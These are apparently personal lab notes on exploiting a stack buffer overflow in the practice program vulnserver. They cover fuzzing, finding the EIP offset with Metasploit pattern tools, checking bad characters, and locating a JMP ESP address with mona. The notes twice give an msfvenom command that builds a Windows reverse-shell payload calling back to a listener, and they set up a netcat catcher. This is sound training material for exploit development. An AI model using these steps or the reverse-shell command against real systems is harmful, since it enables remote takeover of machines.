> [!caution] This page contained a drawing which was not converted.   

![Exported image](Exported%20image%2020241208212440-0.png)

**Spiking****-**sending a bunch of random characters to a program to see if you can break it.  
**Ex script****:**
 
```
s_readline();  
s_string("STATS ");  
s_string_variable("0");

Want to control the EIP value  
The x86 processor maintains an instruction pointer (EIP) register that is a 32-bit value indicating the location in memory where the current instruction starts. 

Want to control the EIP value

msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
EXITFUNC=thread (makes exploit more stable)
-f (for file type) ; export this into c
-a (for architecture) ; x86
-b (for bad characters) "\x00" 
Resulting payload. Copy Pasta into the python script.

Set up netcat listener (based on msfvenom exploit)
Next run vulnserver.exe as administrator. Don't need immunity.

```
 ![Exported image](Exported%20image%2020241208212444-1.png)  
![Exported image](Exported%20image%2020241208212444-2.png)  
![Exported image](Exported%20image%2020241208212445-3.png)  

**Part 1: Finding the offset:**  
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
 ![Exported image](Exported%20image%2020241208212446-4.png)

Want to control the EIP value  
**The x86 processor maintains an instruction pointer** **(EIP)** **register that is a 32-bit value indicating the location in memory where the current instruction starts.**

**Part 2: Finding the offset:**  
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
 ![Exported image](Exported%20image%2020241208212446-5.png)

Want to control the EIP value

![Exported image](Exported%20image%2020241208212447-6.png) ![Exported image](Exported%20image%2020241208212448-7.png)

**Notice: Exact offset is 2003 (In other words, think if you send 2003 "A's" and then 4 "B's" the 4 B's would overwrite the EIP register. This means we control the program.**
 
# Overwriting EIP:

**Run this Script:**
 ![Exported image](Exported%20image%2020241208212452-8.png)  

**Program response: (EIP variable is just the 4 B's we sent because the EBP variable was overflowing with AAAAAAAA)**

![Exported image](Exported%20image%2020241208212453-9.png)  

Finding Bad Characters:
 
# **Resource:** [https://github.com/cytopia/badchars](https://github.com/cytopia/badchars)
 
What are Bad Characters?
 
Characters such as \r , \n , / and ? can cause the line that's being parsed to truncate prematurely and fail to overflow the buffer, or lead to a 404 error instead of calling the vulnerable function. Characters being converted between upper and lower case is another example that will mess with shell code.
 ![Exported image](Exported%20image%2020241208212453-10.png)  

Run bad characters > In immunity debugger right click the ESP value > follow in dump.
 ![Exported image](Exported%20image%2020241208212454-11.png)  

Example:

![Exported image](Exported%20image%2020241208212455-12.png)  

Import mona.py into immunity debugger and call the module with !mona modules

![Exported image](Exported%20image%2020241208212456-13.png)  

Back in Kali: start nasm shell to look for "opt code equivalent"

![Exported image](Exported%20image%2020241208212457-14.png)  

nasm > JMP ESP

![Exported image](Exported%20image%2020241208212501-15.png)  
![Exported image](Exported%20image%2020241208212501-16.png)

Results after running

![Exported image](Exported%20image%2020241208212502-17.png)  
![Exported image](Exported%20image%2020241208212502-18.png)

Set a breakpoint by hitting (alt + F2)-so that we can overwrite the EAP.
 
Run findtherightmodule.py script & notice the result:

![Exported image](Exported%20image%2020241208212504-19.png)

We hit the breakpoint and overode the EIP value:

![Exported image](Exported%20image%2020241208212504-20.png)

Now just need to write the shell code!
 
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

- EXITFUNC=thread (makes exploit more stable)
- -f (for file type) ; export this into c
- -a (for architecture) ; x86
- -b (for bad characters) "\x00"

Resulting payload. Copy Pasta into the python script.

![Exported image](Exported%20image%2020241208212505-21.png)   ![Exported image](Exported%20image%2020241208212509-22.png)  

Set up netcat listener (based on msfvenom exploit)

![Exported image](Exported%20image%2020241208212510-23.png)

Next run vulnserver.exe as administrator. Don't need immunity.
 
Note: Payload size